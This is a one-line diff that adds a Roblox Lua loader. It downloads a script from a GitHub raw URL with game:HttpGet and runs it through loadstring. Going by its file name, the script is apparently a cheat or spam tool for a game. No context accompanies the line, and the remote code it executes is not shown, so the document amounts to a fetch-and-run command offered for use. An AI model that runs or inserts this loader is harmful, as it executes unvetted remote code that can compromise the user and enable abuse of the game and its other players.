@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/runaways-beta-spam3-yoctg17hkvwkkn.lua"))()
